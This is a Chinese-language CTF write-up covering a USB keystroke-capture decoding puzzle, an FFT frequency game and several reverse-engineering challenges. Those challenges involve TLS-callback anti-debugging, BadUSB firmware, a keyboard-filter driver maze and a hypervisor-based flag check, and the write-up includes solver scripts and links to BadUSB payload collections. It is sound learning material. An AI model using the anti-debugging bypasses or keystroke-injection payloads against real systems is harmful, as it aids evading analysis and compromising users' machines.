for capdata in capdatas:
    bdata = bytes.fromhex(capdata)

    if bdata[0] == 0 or bdata[0] == 1: # noral or ctrl
        print(keymap[ bdata[2] ]["normal"], end="")
    elif bdata[0] == 2: # shift
        print(keymap[ bdata[2] ]["shift"], end="")
```

成功後得到以下字串:

```
D'`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\a`_X|V[Tx;:VONSRQJn1MFKJCBfFE>&<`@9!=<5Y9y7654-,P0/o-,%I)ih&%$#z@xw|{ts9wvXWm3~c
```

這邊就有點半經驗半通靈，不過 `malbolge` 程式語言的特色很鮮明，如果曾經看過就會猜到可能是這種語言。而把這串 code 丟到 [Malbolge Online](https://www.tutorialspoint.com/execute_malbolge_online.php) 執行，一開始會因為多了 `c` 失敗，刪除後再執行一次就能拿到 flag`hctf{m4lb0lGe}`。

#### Report Protocol

Format:

| **Offset** | **Size** | **Description**       |
| ---------- | -------- | --------------------- |
| 0          | Byte     | Modifier keys status. |
| 1          | Byte     | Reserved field.       |
| 2          | Byte     | Keypress #1.          |
| 3          | Byte     | Keypress #2.          |
| 4          | Byte     | Keypress #3.          |
| 5          | Byte     | Keypress #4.          |
| 6          | Byte     | Keypress #5.          |
| 7          | Byte     | Keypress #6.          |

Modifier keys status:

| **Bit** | **Bit Length** | **Description**                |
| ------- | -------------- | ------------------------------ |
| 0       | 1              | Left Ctrl.                     |
| 1       | 1              | Left Shift.                    |
| 2       | 1              | Left Alt.                      |
| 3       | 1              | Left GUI (Windows/Super key.)  |
| 4       | 1              | Right Ctrl.                    |
| 5       | 1              | Right Shift.                   |
| 6       | 1              | Right Alt.                     |
| 7       | 1              | Right GUI (Windows/Super key.) |

Ref

- [USB_Human_Interface_Devices](https://wiki.osdev.org/USB_Human_Interface_Devices)
- [HID Usage Tables p.53](https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf)
- [Device Class Definition for Human Interface Devices (HID) p.65](https://www.usb.org/sites/default/files/hid1_11.pdf)
- [keymap](https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2)

P.S. IRP 為 I/O request packet

### freq game

此題把片段的 flag 被當作 frequent (頻率, t) `y = np.sin(2 * np.pi * x * freq) * rge `並以波的形式表示，不過範圍被限制在 0~1 (`np.linspace(0,1,1500)`)，而最後我們會拿到在 0~1 的訊號總和:
$$
{\displaystyle f(t) = 7*sin(2\pi*flag[0]) + 7*sin(2\pi*flag[1]) + 7*sin(2\pi*flag[2]) + 7*sin(2\pi*flag[3])}
$$
透過傅立葉轉換求得函數 `FT`，而已知 freq 介於 0~255 之間，看每種可能的頻率所產生出的 `FT()` 比較高，代表該頻率影響 `FT` 比較大，即是所求:

```python
#!/usr/bin/python3

from pwn import *
import numpy as np
import json
import math

r = remote("127.0.0.1", 6775)
level = 0

r.sendlineafter("input y to start this game, and input hint to get hint:", "y")
r.sendlineafter("input your token:", "123456")

while True:
    y = json.loads(r.recvuntil("]"))
    F_abs = np.abs(np.fft.fft(y))
    freq_list = []
    x = []
    for freq in range(0x100):
        x.append(math.ceil(F_abs[freq]))
        if math.ceil(F_abs[freq]) > 4000:
            freq_list.append(freq)

    x.sort()
    print(level, x)
    level += 1
    payload = " ".join(map(str, freq_list))
    r.sendline(payload)

r.interactive()
```

FFT

- 時域 -> 頻域 (傅立葉級數, Fourier series)
  - 時域: 時間(`t`)、振幅 (`f(t)`)、頻率 (`ω`)
  - 頻域: 振幅 (`f(t)`)、頻率 (`ω`)、相位 (`φ`)
  - 將時域中週期且連續的函數，轉換成頻域中非週期離散的函數
- 傅立葉轉換 (傅立葉變換, Fourier Transformation)
  - 將時域中非週期的連續信號，轉換成頻域中非週期的連續信號
  - 利用歐拉公式 + 摘，求得函數 `FT`
  - 求得的 `FT` 有對稱性

np

- `np.linspace(x, y, num)`: 建立 x ~ y 之間共 num 數量的等差數列
- `np.abs()`: 如果有複數，則回傳 `sqrt(a^2 + b^2)`
- `np.fft.fft()`: This function computes the one-dimensional n-point discrete Fourier Transform (DFT) with the efficient Fast Fourier Transform (FFT) algorithm [CT]

## Re

### LuckyStar☆

使用 `TLScallback()` 來完成程式的主要邏輯，不過如果用 debbuger 執行的話會被 detect，因此要想個辦法繞掉，而關於 TLS callback 可以參考[這篇文章](https://isc.sans.edu/diary/How+Malware+Defends+Itself+Using+TLS+Callback+Functions/6655)。

TLS (Thread Local Storage) 是不同 thread 用來存放 variable 的地方，而資訊記錄在 PE header，而 TLS callback 被用來 initial 與 clear TLS data object，而這個行為會在程式的進入點前執行，因此 debugger 停止在程式進入點前可能就已經執行 TLS callback，這也是 malware 很喜歡用的方法之一。在 debugger attach 上 process 時會:

1. process 執行 `DbgUiConnectToDbg()`
2. `NtDebugActiveProcess()` 告訴 kernel 要開始 debug
3. `DbgUiIssueRemoteBreakin()` 設置斷點 `DbgBreakPoint`，`DbgUiIssueRemoteBreakin()` 會在 debuggee 建立一個 thread 指向 `DbgUiRemoteBreakin`

程式在 `TLScallback()` 中有一段 `if ( !lstrcmpW(off_403508[i], v8[15]) )`，會去檢測是否有 `idaq.exe`、 `x32dbg.exe` 等等 debugger 存在，如果有的話就輸出 LuckyStart 並離開，因此先把這些 string patch 成其他 byte 即可。

運作流程大致如下:

- 在 `ntdll.dll` 與 `kernel32.dll` 中取得 `ZwQuerySystemInformation()`、`NtSetInformationThread()` 以及 `CheckRemoteDebuggerPresent()` 的位置
- 執行 `NtSetInformationThread(GetCurrentThread(), 0x11, 0, 0)`，0x11 代表 `ThreadHideFromDebugger`，此 flag 會把 debug port 清掉，可以參考[此篇文章](https://bbs.pediy.com/thread-249689.htm)，也因此 debugger 下斷點時會收不到訊息或是卡死，所以直接把他 patch 成 nop
- `__scrt_common_main_seh()` 會在 `0x40251B` 執行 `CheckRemoteDebuggerPresent()`，檢查自己是否被 debugger trace，如果有的話就會到 `0x40252F`，更改 `srand()`，讓第二段 unpack 的 code 爛掉，defeat 的方式當然可以動態修改 register value，不過最不麻煩的方法就是在唱歌完等待輸入時再 attach 上去

之後繼續追，會發現他有一個 base64 encoder，會將輸入的 input 做 base64 encode，而且 encode table 跟原本的不一樣  `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/` (大小寫交換)，在 encode 後還會做 xor encode:

```c
  for ( b64encode_len = v6_strlen; v7_idx < b64encode_len; ++v7_idx )
  {
    v8_b64encode_input = *(a4 + 12);
    for ( i = 6; i > -2; i -= 2 )               // 6 4 2 0
    {
      v10 = rand() % 4;
      v11_i = i;
      result = v10 << v11_i;                    // 11000000
                                                // 00110000
                                                // 00001100
                                                // 00000011
      v8_b64encode_input[v7_idx] ^= result;
    }
  }
```

每次 char 都會與 4 組兩個 bit 的 `rand()` value 做 xor，並且對整個 encoded input 都會做。由於輸出結果為 32 byte，因此 `4 * a / 3 == 32`，求得 input 長度為 24。

這邊可以先隨意輸入 24 `a`，求得 base64 的結果 `ywfHywfHywfHywfHywfHywfHywfHywfH` 以及 xor 的結果 `71F65FC5397E245CA985FE2E4AA1AFFAB8E2D056BE5A7AA7ABC5392EF5CE9770`，之後兩者做 xor 就能拿到 `rand()` key，key 再跟 target 做 xor 得到 encoded flag (不過 table 是大小寫相反)，得到的結果使用 `swapcase()` 大小寫交換就能用普通的 base64 decoder 解，最後得到 flag `hctf{1zumi_K0nat4_Mo3}`。

```python
#!/usr/bin/python3                             
                                               
import base64                                  
                                               
target = bytes.fromhex('49E657BD3A47114C95BCEE3272A0F0DEACF2835683496EA9A6C5673CCAC8CC05')
xor_before = b"ywfHywfHywfHywfHywfHywfHywfHywfH"
xor_after = bytes.fromhex("71F65FC5397E245CA985FE2E4AA1AFFAB8E2D056BE5A7AA7ABC5392EF5CE9770")
key = b""                                      
                                               
for i in range(len(xor_before)):               
    key += bytes([ xor_before[i] ^ xor_after[i] ])
                                               
encoded_flag = ""                              
for i in range(len(key)):                      
    encoded_flag += chr(key[i] ^ target[i])    
                                               
print(base64.b64decode(encoded_flag.swapcase()))
```

P.S. 在使用 IDA + x32dbg debug 時，變數提示的 ebp、esp offset 不準，很多時候都會壞掉，所以看 register 比較快。

defeat anti-debugger 的方法有幾種:

- 讓程式停在 system entry point
- 設 bp 在 TLScallback
- 在 detect 後才 attach 上去

### PolishDuck

這題找不到原本給的檔案，這邊就只對 writeup 做研究。

Hardware device reversing 一開始要先確定**型號**跟版型，型號可以知道 hardware resource instruction set 以及 register 等等，版型 (e.g. Arduino) 可以知道功能以及外接的 device 等等。

通常此種題目會給 hex dump，可以用 [hex2bin](https://sourceforge.net/projects/hex2bin/) 將其轉為 binary，下一步就是搜尋型號以及對應的指令集工具，以 arduino 為例子，arduino 型號為 atmel avr microcontroller 中的 ATmega328，對應的 instruction set 為 atmel avr。而在知道指令集後，就會先去找對應指令集的 disassembler 如 `avr-objdump`，或者是嘗試丟到 IDA，如果 IDA 預設沒有 config，可以去找有沒有人家寫好的 IDA config，丟到 `%IDA/cfg` 底下就可以 disassemble 了。能夠看到 assemble 後，會優先找以下類型的 function 來看:

- 程式進入點
- xref 特殊字串
- basic block 長得很怪
- 該型號 datasheet 說明的功能等等

而這題是使用 `badusb`，讓 USB 偽裝成 keyboard 來執行對應的指令，用的 microcontroller 型號是 `Arduino Leonardo`，簡易的介紹在[這篇文章](https://zhuanlan.zhihu.com/p/24854796)

- [flare-on arduino 解題過程](http://vulnerablespace.blogspot.com/2017/11/ctf-writeup-flare-on-2017-09.html)
- [badusb example](https://github.com/Xyntax/BadUSB-code)
- [badusb payload](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)
- [video instruction](https://www.youtube.com/watch?v=T787I_itGmA&ab_channel=Seytonic)

### seven

該 .sys 檔的檔案格式為 `PE32+ executable (native) x86-64, for MS Windows`，PE32+ 指的就是 64bit 的 PE file。function 數量很少，稍微看一下就可以看到有個 `CompletionRoutine` 的 assignment，看起來就是某個 callback function，並且根據 object name 以及使用到的 function，能得知這個檔案是一個 windows driver 的驅動程式，主要的程式邏輯在 `sub_1400012F0`。

以下為 keyboard input 處理的程式碼:

```c
if ( a2->IoStatus.Status >= 0 )
  {
    v3 = a2->AssociatedIrp.SystemBuffer;
    v4 = a2->IoStatus.Information / 0xC;
    if ( v4 )
    {
      v5 = dword_1400030E4;
      v6 = &v3->Size;
      v7 = v4;
      while ( *(&v3->Size + 1) ) // 用來檢查有沒有資料而已
      {
LABEL_30:
        v6 += 6; // word + 6 == address offset 12
        // 每次都取出一組 keyboard input
        if ( !--v7 )
          goto LABEL_31;
      }
  ...
```

包含 keyboard input data 封包的結構 `KEYBOARD_INPUT_DATA` 的大小為 0xC:

```c
// KEYBOARD_INPUT_DATA contains one packet of keyboard input data.
typedef struct _KEYBOARD_INPUT_DATA {
  USHORT UnitId;
  USHORT MakeCode;
  USHORT Flags;
  USHORT Reserved;
  ULONG  ExtraInformation;
} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
```

因此猜測 `IoStatus.Information` 放的值會是 total size，除 0xC 會得到總共 keyboard input data 數量，也就是按了幾次 keyboard，最後在 `v7` 為 0 也就是沒有資料後，跳去 `LABEL_31` 結束程式。



`aO` 變數存放類似地圖的物件，大小為 0xe (224)，以 0x10 為一個 row，可以印出以下畫面:

```
****************
o..............*
**************.*
************...*
***********..***
**********..****
*********..*****
********..******
*******..*******
******..********
*****..*********
****..**********
****7***********
****************
```

可以判斷 `dword_1400030E4` 與 `v5` 是等價的，都代表下個移動的位置，初始值為 0x10，也能知道 `*v6` 與 `v8` 都是 user input，不過值不等於 ascii，待會會需要查表。而位移的大小有 `+-0x10`, `+-0xD0`, `+-1`, `+-0xf`，並且由畫面可以知道 `+-0x10` 與 `+-1` 是在人物還沒超出畫面時的正常位移大小，分別為垂直與水平位移；而 `+-0xD0` 與 `+-0xf` 是超出畫面的位移。

吃到輸出時會更新當前位置為 `.`，並且做移動的處理，如果移動會碰到牆 `*`，就會輸出 `-1s\n` 而死亡；如果下個位置為 `7` 就代表獲勝，輸出 `The input is the flag!`，如果都不是則更新當前位置 `o`。

現在只差 0x11、0x1f、0x1e、0x20 分別對應到 keyboard 上的哪些字，`KEYBOARD_INPUT_DATA` 結構中用來描述 input 的 member 為 `MakeCode` (Specifies the scan code associated with a key press)，而他所儲存的是 scan code，能找到對應的 [table](https://www.millisecond.com/support/docs/v6/html/language/scancodes.htm):

- 0x11 == 17 == W
- 0x1f == 31 == S
- 0x1e == 30 == A
- 0x20 == 32 == D

找出能夠通關的 key sequence 就是 flag 了 `hctf{ddddddddddddddssaasasasasasasasasas}`。



P.S. 不太確定為什麼 `*v6` 解出來的不會是 `UnitId` 而是 `MakeCode`。

- `IoCompletionRoutine(DeviceObject, Irp, [Context])`: The IoCompletion routine completes the processing of I/O operations
  - `DeviceObject`: Caller-supplied pointer to a DEVICE_OBJECT structure
  - `Irp`: Caller-supplied pointer to an IRP structure that describes the I/O operation
    - The **IRP** structure is a partially opaque (不透明的) structure that represents an I/O request packet
- `IRP_MN_QUERY_DEVICE_TEXT` (`_IO_STATUS_BLOCK.Information`, 0xC): The PnP manager uses this IRP to get a device's description or location information
- PnP manager (Plug-and-Play)
- [_IRP structure ](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp)
  - `AssociatedIrp.MasterIrp`: Pointer to the master IRP in an IRP that was created by a highest-level driver's call to IoMakeAssociatedIrp
  - `MdlAddress`: Pointer to an MDL describing a user buffer, if the driver is using direct I/O, and the IRP major function code is one of the following
- [_DEVICE_OBJECT structure ](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object)
- MDL (memory descriptor list): describe the physical page layout for a virtual memory buffer
  - https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_mdl
- `\\Driver\\kbdclass` 為 keyboard driver，define 為 `KBD_DRIVER_NAME`
- SMC (Self Modifying Code)

### spiral

Intel 的 Hardware Enabled Virtualization 技術稱做 Intel VT (VT-X)；而 AMD 稱做 AMD-V 或是 SVM。

VMM hypervisor

- Hypervisor 分成 type-1 (跑在 hardware) 以及 type-2 (跑在 OS)
- user mode application 跑在 Ring 3，kernel mode 跑在 Ring 0，而 hev (hypervisor) 會建立一個 Ring -1 的特權層，權限會 >= Ring 0，此層也被稱做 VMX (Virtual Machine Extension)。
- VMX 本身又分成兩種模式
  - VMX root: 此權限下跑的 code 又被稱做 VMM (virtual machine monitor)，也被叫做 hypervisor
  - VMX non-root: 此權限下跑的 code 被稱作 guest machine
- VMM 負責處理虛擬 HW 以及真實 HW 的溝通，也讓虛擬機彼此不會互相干擾，虛擬機也被稱作 virtual machine (VM)
- 一些名詞的對立
  - VMM <---> VM
  - host <---> guest
- hypervisor 啟動 guest 的方式有三種:
  1. KVM (kernel virtual machine) 先啟動 HostOS (MBR 所主導的 OS) 才啟動 Hypervisor
     - 因此 KVM 是 Type-2 的 Hypervisor
     - 在這個情況下 HostOS 建立比自己權限還高的 Hypervisor，不過即使權限更高，也不一定能夠 touch 到 HostOS
  2. MBR 主導的不是 HostOS 而是 Hypervisor，因此 HostOS 由 Hypervisor 所主導
  3. 沒有 HostOS，只有 Hypervisor 創建 Guest
     - 因為不存在，又被稱作 Unknown Virtual Machine
  4. 因此可以得到一個結論:
     - MBR 先主導 Hypervisor --> Type-1
     - MBR 先主導 HostOS --> Type-2

VMM 與 VM 的交互過程如下:

- inst VMXON，進入 VMM (VMXON (Enter VMX operation))
- inst VMLAUNCH，啟動 VM
- inst `#VMEXIT`，退出 VM，回到 VMM
- inst VMRESUME，回到 VM
- inst VMXOFF，退出 VMM
- 進入 VMM 的過程
  - 檢查是否 support VT (Virtualization Technology)
  - 分配+初始化+執行 VMXON
  - 分配+初始化(VMCLEAR)+加載(VMPTRLD)+填充 VMCS (Virtual Machine Control Structure)
  - 執行 VMXLAUNCH 來啟動 VM

為了要 support memory mapping，VT 有 EPT (Extended Page Table) 的技術:

- CR3 register ---> GPT(guest Page Table)
  - 作用：VM linear memory 轉成 VM physical memory

- EPTP ---> EPT page table
  - 作用：VM physical memory 轉成 real physical memory



程式的執行方式為 `Spiral.exe hctf{<input_73_len>}`，長度 73 的 input 被分做 46 + 27，前面放入 `byte_10E73E8`，後面放入 `byte_10E7418`。`byte_10E73E8` 的 46 bytes 會在 `sub_102F4C0` 被分成兩個部分，分別是 `84A2C0` 儲存每個 byte 的後 3 bit (`0b00000111`)，以及 `84A330` 儲存每個每個 byte 的前 5 個 bit >> 3 (`0b11111000`)。在 `sub_102F820` 會產生 encoded data (in `10E7360`)，每兩個 bytes 一組，第一個 byte 存 prev46 的最後 3 bits，第二個 byte 存 prev46 的前 5 bites >> 3。最後在 `sub_102933D` 會根據 `last3bits` 做 encode，最後比對某個位置的值，而 decode 很簡單，只要將那些值轉回即可:

```python
#!/usr/bin/python3

encoded_flag = b'\x07\xe7\x07\xe4\x01\x19\x03P\x07\xe4\x01 \x06\xb7\x07\xe4\x01"\x00(\x00*\x02T\x07\xe4\x01\x1f\x02P\x05\xf2\x04\xcc\x07\xe4\x00(\x06\xb3\x05\xf8\x07\xe4\x00(\x06\xb2\x07\xe4\x04\xc0\x00/\x05\xf8\x07\xe4\x04\xc0\x00(\x05\xf0\x07\xe3\x00+\x04\xc4\x05\xf6\x03L\x04\xc0\x07\xe4\x05\xf6\x06\xb3\x01\x19\x07\xe3\x05\xf7\x01\x1f\x07\xe4'
     
def decoder(first5b_val, last3b_val):
    if last3b_val == 0:
        return first5b_val - 34
    elif last3b_val == 1:
        return first5b_val - 19
    elif last3b_val == 2:
        return first5b_val - 70
    elif last3b_val == 3:
        return first5b_val - 66
    elif last3b_val == 4:
        return first5b_val ^ 0xCA
    elif last3b_val == 5:
        return first5b_val ^ 0xFE
    elif last3b_val == 6:
        return first5b_val ^ 0xBE
    elif last3b_val == 7:
        return first5b_val ^ 0xEF
    else:
        print("error")
        exit(1)
     
for i in range(0, len(encoded_flag), 2):
    last3b_val = encoded_flag[i]
    enc_first5b_val = encoded_flag[i+1]
     
    first5b_val = decoder(enc_first5b_val, last3b_val) & 0xff
    print(chr( ((first5b_val << 3) & 0x78) | last3b_val ), end='')
```

得到前 46 bytes 的 flag `G_1s_iN_y0@r_aRe4_0n5_0f_Th5_T0ugHtEST_En1gMa_`。

之後在 `sub_102F390` 中會發現  `byte_10E4F78` 儲存順序的 `last27bytes`、`byte_10E5078` 儲存逆序的 `last27bytes`，接著到 `7F2B0`，先用 `78FAA` 算 checksum，更新 `10E2000` 後，由於 input 與 `10E2000` 有重疊到，因此會寫在新的 `spiral_core.sys` 的某個地方。之後到 `sub_787DA` 中初始化執行環境，並透過 `13733C` 載入 `spiral_core.sys` driver 來執行。

之後就是 driver 的程式碼了，不過後來不會解，因此後續部分就參考[官方 writeup](https://bbs.pediy.com/thread-247741.htm#msg_header_h1_0)，也有其他 [writeup](https://xz.aliyun.com/t/3242#toc-4) 可以參考，就做為之後的複習。

- [flare-on 類似題目](https://blog.attify.com/flare-on-5-writeup-part7/)



